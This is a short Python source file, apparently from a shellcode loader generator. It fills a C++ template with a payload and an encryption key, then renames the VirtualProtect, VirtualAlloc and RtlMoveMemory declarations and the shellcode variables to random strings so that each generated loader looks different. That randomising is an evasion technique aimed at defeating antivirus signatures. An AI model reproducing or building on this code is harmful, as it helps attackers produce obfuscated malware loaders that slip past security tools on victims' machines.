from lib import utils
def variables(cpp, payload, key):
	cpp = cpp.replace('$SHELLCODE$',payload)
	cpp = cpp.replace('$KEY$',key)

	cpp = cpp.replace('$VirtualProtectDec$', utils.random_string())
	cpp = cpp.replace('$VirtualAllocDec$', utils.random_string())
	cpp = cpp.replace('$RtlMoveMemoryDec$', utils.random_string())

	cpp = cpp.replace('$VirtualProtectVar$', utils.random_string())
	cpp = cpp.replace('$VirtualAllocVar$', utils.random_string())
	cpp = cpp.replace('$RtlMoveMemoryVar$', utils.random_string())	

	cpp = cpp.replace('$EncryptedShellcodeVar$',utils.random_string())
	cpp = cpp.replace('$ShellcodeVar$',utils.random_string())
	return cpp